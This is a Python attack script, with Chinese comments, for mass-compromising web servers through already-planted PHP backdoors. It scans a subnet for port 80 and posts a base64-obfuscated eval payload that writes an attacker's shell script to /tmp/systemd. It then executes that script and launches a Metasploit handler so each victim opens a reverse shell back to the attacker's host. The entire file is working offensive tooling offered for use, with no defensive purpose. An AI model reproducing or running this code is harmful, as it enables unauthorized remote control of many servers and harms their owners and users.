 #!/usr/bin/env python3
# -*-coding:utf-8-*-

'''
根据小马批量获取反弹shell，
并用msf实现批量命令执行
'''

import optparse
import nmap
import requests
import base64
import os

def nmapscan(subnet): #nmap扫描
    nmscan = nmap.PortScanner()
    nmscan.scan(subnet,'80')
    tgthosts = []
    for host in nmscan.all_hosts():
        if nmscan[host].has_tcp(80):
            state = nmscan[host]['tcp'][80]['state']
            if state == 'open':
                tgthosts.append(host)
    return tgthosts

def setuphandler(configfile,lhost,lport):#开启反弹shell和监听
    configfile.write('use exploit/multi/handler\n')
    configfile.write('set payload linux/armle/shell/reverse_tcp\n')
    configfile.write('set LPORT ' + str(lport) +'\n')
    configfile.write('set LHOST ' + str(lhost) + '\n')
    configfile.write('set exitonsession false\n')
    configfile.write('exploit -j\n')

def post(target_url,data):#post方式提交数据
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-GB;q=0.6,en;q=0.4,en-US;q=0.2,ja;q=0.2'
    }
    requests.post(url=target_url, headers=headers, data=data)

def data(key,shelldir):#构造提交的数据
    path = '/tmp/systemd'#存放shell的路径
    try:
        with open(shelldir,'r') as f:
            shell=f.read()
    except:
        print('[-]please check shellfile!')
        exit(1)
    datas = {}
    datas[key] = '@eval(base64_decode($_POST[z0]));'
    datas['z0'] = 'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOwpAc2V0X3RpbWVfbGltaXQoMCk7CkBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7CiRmPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTsKJGM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOwplY2hvKEBmd3JpdGUoZm9wZW4oJGYsInciKSwkYykpOwpkaWUoKTs='
    datas['z1'] = base64.b64encode(path.encode('utf-8')).decode('utf-8')
    datas['z2'] = base64.b64encode(shell.encode('utf-8')).decode('utf-8')
    return datas

def postdata(serverhosts,url,key,shelldir):#post数据
    urls = []
    for target in serverhosts:
        target_url = 'http://'+str(target) + str(url)
        datas = data(key,shelldir)
        try:
            post(target_url,datas)
        except:
            print('[-]ip:'+target+' can not post shell')
        urls.append(target_url)
    return urls

def bash(urls,key):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-GB;q=0.6,en;q=0.4,en-US;q=0.2,ja;q=0.2',
    }
    data = {key: 'system(\'bash /tmp/systemd\');'}
    for url in urls:
        try:
            requests.post(url=url, headers=headers, data=data, timeout=0.05)
        except:
            print('[-]'+url+' bash error one!')

def main():
    parser = optparse.OptionParser('usage%prog ' + '-R <rhost> -L <lhost> -P <lport> -U <url> -K <key>')
    parser.add_option('-R', dest='rhost', type='string', help='target address:192.168.1.1-255')
    parser.add_option('-L', dest='lhost', type='string', help='local address:192.168.1.101')
    parser.add_option('-P', dest='lport', type='string', help='local port:6666')
    parser.add_option('-U', dest='url', type='string', help='target url:/class/backdoor.php')
    parser.add_option('-K', dest='key', type='string', help='target key:backdoor')
    (options, args) = parser.parse_args()
    if (options.rhost == None) | (options.lhost == None) | (options.lport == None) | (options.url == None) | (options.key == None):
        print(parser.usage)
        exit(0)
    subnet = options.rhost
    lhost = options.lhost
    lport = options.lport
    url = options.url
    key = options.key
    shelldir = '/root/Desktop/shell.sh'

    try:
        serverhosts=nmapscan(subnet=subnet)
    except Exception as e:
        print(e)
    print('[+]scan end!')
    if(len(serverhosts)==0):
        print('[-]please check ipsub!')
        exit(1)
    else:
        pass

    configfile = open('/root/Desktop/hander.rc', 'w')
    setuphandler(configfile = configfile,lhost = lhost,lport = lport)
    configfile.close()
    print('[+]create hander end!')

    try:
        urls = postdata(serverhosts=serverhosts, url=url, key=key, shelldir=shelldir)
    except Exception as e:
        print(e)
    print('[+]post shell end!')

    try:
        bash(urls,key)
    except Exception as e:
        print(e)
        print('[+]bash end!')
    os.system('msfconsole -r /root/Desktop/hander.rc')

if __name__ == '__main__':
    main()





